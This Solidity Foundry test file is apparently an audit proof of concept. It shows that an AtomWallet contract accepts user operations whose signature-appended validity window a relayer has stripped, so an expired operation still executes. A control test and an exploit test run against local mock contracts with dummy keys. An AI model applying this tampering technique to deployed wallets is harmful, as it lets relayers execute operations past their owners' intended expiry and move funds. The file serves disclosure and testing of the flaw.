// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import { Test } from "forge-std/src/Test.sol";
import { EntryPoint } from "@account-abstraction/core/EntryPoint.sol";
import { IEntryPoint } from "@account-abstraction/interfaces/IEntryPoint.sol";
import { PackedUserOperation } from "@account-abstraction/interfaces/PackedUserOperation.sol";

import { AtomWallet } from "src/protocol/wallet/AtomWallet.sol";

contract MockMultiVaultForAtomWalletPOC {
    address internal immutable _atomWarden;

    constructor(address atomWarden_) {
        _atomWarden = atomWarden_;
    }

    function getAtomWarden() external view returns (address) {
        return _atomWarden;
    }

    function claimAtomWalletDepositFees(bytes32) external pure { }
}

contract ExecutionRecorder {
    uint256 public timesCalled;
    address public lastCaller;

    function record() external {
        timesCalled++;
        lastCaller = msg.sender;
    }
}

contract Simple1967Proxy {
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC;

    constructor(address implementation, bytes memory initData) payable {
        assembly {
            sstore(IMPLEMENTATION_SLOT, implementation)
        }

        (bool ok, bytes memory revertData) = implementation.delegatecall(initData);
        if (!ok) {
            assembly {
                revert(add(revertData, 32), mload(revertData))
            }
        }
    }

    fallback() external payable {
        assembly {
            let implementation := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())

            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {
        assembly {
            let implementation := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())

            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

contract AtomWalletValidityMetadataTamperingSingleFilePOC is Test {
    uint256 internal constant OWNER_PRIVATE_KEY = 0xA11CE;
    uint256 internal constant WARDEN_PRIVATE_KEY = 0xB0B;
    uint256 internal constant CALL_GAS_LIMIT = 300_000;
    uint256 internal constant VERIFICATION_GAS_LIMIT = 300_000;
    uint256 internal constant PRE_VERIFICATION_GAS = 100_000;
    uint256 internal constant MAX_FEE_PER_GAS = 1 gwei;
    uint256 internal constant MAX_PRIORITY_FEE_PER_GAS = 1 gwei;

    EntryPoint internal entryPoint;
    AtomWallet internal wallet;
    MockMultiVaultForAtomWalletPOC internal multiVault;
    ExecutionRecorder internal recorder;

    address internal owner;
    address internal warden;
    address payable internal beneficiary;

    function setUp() public {
        vm.warp(1_700_000_000);

        owner = vm.addr(OWNER_PRIVATE_KEY);
        warden = vm.addr(WARDEN_PRIVATE_KEY);
        beneficiary = payable(makeAddr("beneficiary"));

        entryPoint = new EntryPoint();
        multiVault = new MockMultiVaultForAtomWalletPOC(warden);
        recorder = new ExecutionRecorder();

        AtomWallet implementation = new AtomWallet();
        bytes memory initData =
            abi.encodeCall(AtomWallet.initialize, (address(entryPoint), address(multiVault), bytes32("atom")));
        wallet = AtomWallet(payable(address(new Simple1967Proxy(address(implementation), initData))));

        vm.prank(warden);
        wallet.transferOwnership(owner);

        vm.prank(owner);
        wallet.acceptOwnership();

        vm.deal(address(wallet), 10 ether);
    }

    function test_control_originalMetadataExpiresOperation() external {
        uint48 validUntil = uint48(block.timestamp + 1 hours);

        PackedUserOperation memory userOp = _buildUserOp("");
        bytes32 userOpHash = entryPoint.getUserOpHash(userOp);
        bytes memory rawSignature = _rawSignature(userOpHash);
        userOp.signature = abi.encodePacked(rawSignature, validUntil, uint48(0));

        vm.warp(uint256(validUntil) + 1);

        vm.expectRevert(abi.encodeWithSelector(IEntryPoint.FailedOp.selector, 0, "AA22 expired or not due"));
        entryPoint.handleOps(_asArray(userOp), beneficiary);

        assertEq(recorder.timesCalled(), 0);
    }

    function test_exploit_relayerCanRemoveValidityWindowAndExecuteAfterExpiry() external {
        uint48 originalValidUntil = uint48(block.timestamp + 1 hours);

        PackedUserOperation memory userOp = _buildUserOp("");
        bytes32 userOpHash = entryPoint.getUserOpHash(userOp);
        bytes memory rawSignature = _rawSignature(userOpHash);

        bytes memory ownerIntendedSignature = abi.encodePacked(rawSignature, originalValidUntil, uint48(0));
        bytes memory relayerTamperedSignature = abi.encodePacked(rawSignature, uint48(0), uint48(0));

        PackedUserOperation memory intendedUserOp = _buildUserOp(ownerIntendedSignature);
        PackedUserOperation memory tamperedUserOp = _buildUserOp(relayerTamperedSignature);

        assertEq(entryPoint.getUserOpHash(intendedUserOp), entryPoint.getUserOpHash(tamperedUserOp));

        vm.warp(uint256(originalValidUntil) + 1);

        entryPoint.handleOps(_asArray(tamperedUserOp), beneficiary);

        assertEq(recorder.timesCalled(), 1);
        assertEq(recorder.lastCaller(), address(wallet));
    }

    function _buildUserOp(bytes memory signature) internal view returns (PackedUserOperation memory userOp) {
        userOp.sender = address(wallet);
        userOp.nonce = 0;
        userOp.initCode = "";
        userOp.callData = abi.encodeWithSelector(
            AtomWallet.execute.selector, address(recorder), 0, abi.encodeCall(ExecutionRecorder.record, ())
        );
        userOp.accountGasLimits = bytes32((uint256(VERIFICATION_GAS_LIMIT) << 128) | CALL_GAS_LIMIT);
        userOp.preVerificationGas = PRE_VERIFICATION_GAS;
        userOp.gasFees = bytes32((uint256(MAX_PRIORITY_FEE_PER_GAS) << 128) | MAX_FEE_PER_GAS);
        userOp.paymasterAndData = "";
        userOp.signature = signature;
    }

    function _rawSignature(bytes32 userOpHash) internal returns (bytes memory) {
        bytes32 ethSignedUserOpHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", userOpHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_PRIVATE_KEY, ethSignedUserOpHash);
        return abi.encodePacked(r, s, v);
    }

    function _asArray(PackedUserOperation memory userOp) internal pure returns (PackedUserOperation[] memory ops) {
        ops = new PackedUserOperation[](1);
        ops[0] = userOp;
    }
}
